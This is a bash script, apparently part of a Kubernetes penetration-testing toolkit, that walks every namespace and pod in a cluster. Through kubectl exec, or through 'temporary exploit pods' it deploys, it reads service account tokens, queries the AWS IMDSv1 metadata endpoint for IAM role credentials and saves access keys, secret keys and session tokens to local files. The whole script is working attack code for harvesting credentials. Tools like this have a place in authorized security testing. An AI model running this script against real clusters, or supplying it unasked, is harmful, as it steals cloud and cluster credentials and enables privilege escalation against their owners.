#!/bin/bash

# ================================
# Check IMDSv1 Vulnerability
# ================================

check_imds_vulnerability() {
    log "Checking IMDSv1 vulnerability..." INFO
    log "Starting check_imds_vulnerability." INFO

    # Parse optional --deploy flag
    DEPLOY_MODE=false
    while [[ "$#" -gt 0 ]]; do
        case $1 in
            --deploy)
                DEPLOY_MODE=true
                shift
                ;;
            -h|--help)
                echo "Usage: check_imds_vulnerability [--deploy]"
                echo ""
                echo "Options:"
                echo "  --deploy    Enable deployment of temporary exploit pods in namespaces where exec is not permitted."
                echo "  -h, --help  Display this help message."
                return
                ;;
            *)
                log "Unknown parameter passed: $1" ERROR
                echo "Usage: check_imds_vulnerability [--deploy]"
                echo ""
                echo "Options:"
                echo "  --deploy    Enable deployment of temporary exploit pods in namespaces where exec is not permitted."
                echo "  -h, --help  Display this help message."
                return 1
                ;;
        esac
    done

    for resource in "${RESOURCE_TYPES[@]}"; do
        log "Checking for 'create' permissions on resource type '$resource'..." INFO
        # Get all namespaces
        namespaces=$(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}')
        for ns in $namespaces; do
            log "Processing namespace: $ns" INFO
            # Check if the user has 'create' permissions for the resource type in the namespace
            if kubectl auth can-i create "$resource" -n "$ns" >/dev/null 2>&1; then
                log "  Permission to create '$resource' in namespace '$ns' confirmed." INFO
                # Get all pods in the namespace
                pods=$(kubectl get pods -n "$ns" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")
                if [ -z "$pods" ]; then
                    log "  No pods found in namespace '$ns'. Skipping to next namespace." WARN
                    continue
                fi
                for pod in $pods; do
                    log "  ----" INFO
                    log "  Processing pod: $pod in namespace: $ns" INFO
                    # Attempt to exec into the pod
                    if kubectl auth can-i exec pods/"$pod" -n "$ns" >/dev/null 2>&1; then
                        log "    Exec permissions available on pod '$pod'. Performing exploit." INFO
                        deploy_exploit_existing_pods "$ns" "$pod"
                    else
                        log "    Exec permissions NOT available on pod '$pod'." INFO
                        if [ "$DEPLOY_MODE" = true ]; then
                            log "    --deploy flag is set. Attempting to deploy temporary exploit pod." INFO
                            # Deploy temporary exploit pod without specifying a service account
                            unique_suffix=$(date +%s%N)
                            temp_pod_name="temp-exploit-pod-$unique_suffix"
                            deploy_temporary_pod_no_sa "$ns" "$temp_pod_name"
                            retrieve_pod_data "$ns" "$temp_pod_name"
                            cleanup_temporary_pod "$ns" "$temp_pod_name"
                        else
                            log "    Skipping deployment of temporary exploit pod since '--deploy' flag is not set." INFO
                            # Even if exec is not available and deploy is not enabled, retrieve available data
                            retrieve_service_account_secrets "$ns" "$pod"
                        fi
                    fi
                done
            else
                log "  No 'create' permissions for resource type '$resource' in namespace '$ns'. Skipping to next namespace." INFO
            fi
        done
    done

    log "Completed check_imds_vulnerability." SUCCESS
}

# -------------------------------
# Helper Functions
# -------------------------------

# Deploy a temporary exploit pod without specifying a service account
deploy_temporary_pod_no_sa() {
    local namespace=$1
    local pod_name=$2

    log "Deploying temporary exploit pod '$pod_name' in namespace '$namespace' without specifying a service account..." INFO

    kubectl run "$pod_name" \
        --image=alpine \
        --restart=Never \
        --namespace="$namespace" \
        --command -- /bin/sh -c "
            apk add --no-cache curl jq &&
            mkdir -p /output &&
            # Retrieve service account token
            cat /var/run/secrets/kubernetes.io/serviceaccount/token > /output/service_account_token.txt &&
            # Attempt to access IMDSv1 IAM roles endpoint
            curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /output/iam_roles.txt &&
            # Extract IAM role name
            ROLE=\$(head -n1 /output/iam_roles.txt) &&
            if [ -n \"\$ROLE\" ]; then
                echo \"IAM Role: \$ROLE\" > /output/iam_role.txt &&
                # Retrieve IAM credentials
                curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE > /output/iam_credentials.json &&
                # Extract and save IAM credentials
                jq -r '.AccessKeyId' /output/iam_credentials.json > /output/aws_access_key_id.txt &&
                jq -r '.SecretAccessKey' /output/iam_credentials.json > /output/aws_secret_access_key.txt &&
                jq -r '.Token' /output/iam_credentials.json > /output/aws_session_token.txt &&
                jq -r '.Expiration' /output/iam_credentials.json > /output/aws_expiration.txt
            else
                echo \"No IAM Role Found\" > /output/iam_role.txt
            fi &&
            # Exit the container after ensuring all commands have executed
            sleep 10
    " >/dev/null 2>&1

    # Wait for the pod to complete
    if ! retry_command kubectl wait --for=condition=Succeeded pod/"$pod_name" -n "$namespace" --timeout=120s; then
        log "Error: Temporary exploit pod '$pod_name' did not succeed in namespace '$namespace'." ERROR
        return 1
    fi

    log "Temporary exploit pod '$pod_name' completed successfully in namespace '$namespace'." INFO
}

# Deploy exploit on existing pods
deploy_exploit_existing_pods() {
    local namespace=$1
    local pod=$2
    local pod_dir="$OUTPUT_DIR/$namespace/$pod"

    mkdir -p "$pod_dir" || { log "Error: Failed to create directory $pod_dir." ERROR; return; }

    log "  Retrieving service account for pod '$pod'..." INFO
    # Get the service account associated with the pod
    service_account=$(kubectl get pod "$pod" -n "$namespace" -o jsonpath="{.spec.serviceAccountName}")

    if [ -z "$service_account" ]; then
        log "    No service account found for pod '$pod' in namespace '$namespace'. Skipping." WARN
        return
    fi

    log "    Service account: $service_account" INFO

    log "  Attempting to retrieve service account token from pod '$pod'..." INFO
    # Retrieve service account token
    sa_token=$(kubectl exec -n "$namespace" "$pod" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)

    if [ -z "$sa_token" ]; then
        log "    Failed to retrieve service account token from pod '$pod'. Skipping." WARN
        return
    fi

    # Save the service account token
    echo "$sa_token" > "$pod_dir/service_account_token.txt"
    log "    Service account token saved to '$pod_dir/service_account_token.txt'." INFO

    log "  Performing IMDSv1 exploit on pod '$pod'..." INFO
    # Attempt IMDSv1 exploit: retrieve IAM roles
    iam_roles=$(kubectl exec -n "$namespace" "$pod" -- curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

    if [ -n "$iam_roles" ]; then
        echo "$iam_roles" > "$pod_dir/iam_roles.txt"
        log "    IAM roles saved to '$pod_dir/iam_roles.txt'." INFO
        iam_role=$(echo "$iam_roles" | head -n1)
        if [ -n "$iam_role" ]; then
            echo "IAM Role: $iam_role" > "$pod_dir/iam_role.txt"
            log "    IAM Role: $iam_role" INFO

            # Retrieve IAM credentials for the role
            iam_credentials=$(kubectl exec -n "$namespace" "$pod" -- curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$iam_role")

            if [ -n "$iam_credentials" ]; then
                echo "$iam_credentials" > "$pod_dir/iam_credentials.json"
                log "    IAM credentials saved to '$pod_dir/iam_credentials.json'." INFO

                # Extract IAM credentials components using jq
                access_key=$(echo "$iam_credentials" | jq -r '.AccessKeyId')
                secret_key=$(echo "$iam_credentials" | jq -r '.SecretAccessKey')
                session_token=$(echo "$iam_credentials" | jq -r '.Token')
                expiration=$(echo "$iam_credentials" | jq -r '.Expiration')

                # Save IAM credentials components
                echo "AccessKeyId=$access_key" > "$pod_dir/aws_access_key_id.txt"
                echo "SecretAccessKey=$secret_key" > "$pod_dir/aws_secret_access_key.txt"
                echo "SessionToken=$session_token" > "$pod_dir/aws_session_token.txt"
                echo "Expiration=$expiration" > "$pod_dir/aws_expiration.txt"

                log "    IAM credentials components saved." INFO
            else
                log "    Failed to retrieve IAM credentials for role '$iam_role' from pod '$pod'." ERROR
            fi
        else
            log "    No IAM role name found in '$pod_dir/iam_roles.txt'." WARN
        fi
    else
        log "    No IAM roles found for pod '$pod' in namespace '$namespace'." WARN
    fi
}

# Retrieve service account tokens via secrets
retrieve_service_account_secrets() {
    local namespace=$1
    local pod=$2
    local pod_dir="$OUTPUT_DIR/$namespace/$pod"

    log "    Attempting to retrieve service account tokens from secrets for pod '$pod'..." INFO

    # Get the service account associated with the pod
    service_account=$(kubectl get pod "$pod" -n "$namespace" -o jsonpath="{.spec.serviceAccountName}")

    if [ -z "$service_account" ]; then
        log "      No service account associated with pod '$pod'." WARN
        return
    fi

    log "      Service account: $service_account" INFO

    # Get all secret names associated with the service account of type 'kubernetes.io/service-account-token'
    secret_names=$(kubectl get serviceaccount "$service_account" -n "$namespace" -o jsonpath="{.secrets[?(@.type=='kubernetes.io/service-account-token')].name}")

    if [ -z "$secret_names" ]; then
        log "      No service account token secrets found for service account '$service_account' in namespace '$namespace'." WARN
        return
    fi

    # Iterate over each secret name
    for secret_name in $secret_names; do
        log "      Processing secret '$secret_name' for service account '$service_account'..." INFO

        # Retrieve the token from the secret
        sa_token=$(kubectl get secret "$secret_name" -n "$namespace" -o jsonpath="{.data.token}" | base64 --decode)

        if [ -n "$sa_token" ]; then
            echo "$sa_token" > "$pod_dir/service_account_token_from_secret_$secret_name.txt"
            log "        Service account token retrieved from secret '$secret_name' and saved to '$pod_dir/service_account_token_from_secret_$secret_name.txt'." INFO
        else
            log "        Failed to decode service account token from secret '$secret_name' in namespace '$namespace'." ERROR
        fi
    done
}

# Retrieve data from a pod and save it to the output directory
retrieve_pod_data() {
    local namespace=$1
    local pod_name=$2
    local pod_dir="$OUTPUT_DIR/$namespace/$pod_name"

    mkdir -p "$pod_dir" || { log "Error: Failed to create directory $pod_dir." ERROR; return; }

    log "Retrieving data from pod '$pod_name' in namespace '$namespace'..." INFO

    # Copy the /output directory from the pod to the local output directory
    if kubectl cp "$namespace/$pod_name:/output" "$pod_dir/" >/dev/null 2>&1; then
        log "Data successfully retrieved and saved to '$pod_dir/'." INFO
    else
        log "Error: Failed to copy data from pod '$pod_name' in namespace '$namespace'." ERROR
    fi
}

# Cleanup: Delete the temporary exploit pod
cleanup_temporary_pod() {
    local namespace=$1
    local pod_name=$2

    log "Deleting temporary exploit pod '$pod_name' in namespace '$namespace'..." INFO
    if kubectl delete pod "$pod_name" -n "$namespace" --ignore-not-found >/dev/null 2>&1; then
        log "Temporary exploit pod '$pod_name' deleted." INFO
    else
        log "Error: Failed to delete temporary exploit pod '$pod_name' in namespace '$namespace'." ERROR
    fi
}

# Retry a command up to 3 times with a 2-second delay between attempts
retry_command() {
    local retries=3
    local count=0
    until "$@"; do
        ((count++))
        if [ "$count" -ge "$retries" ]; then
            return 1
        fi
        sleep 2
    done
}

# -------------------------------
# Integration with Existing Module Functions
# -------------------------------

# Ensure RESOURCE_TYPES is defined
if [ -z "${RESOURCE_TYPES+x}" ]; then
    RESOURCE_TYPES=("pods")
    log "RESOURCE_TYPES not defined. Defaulting to ('pods')." WARN
fi


# ================================
# End of check_imds_vulnerability.sh
# ================================
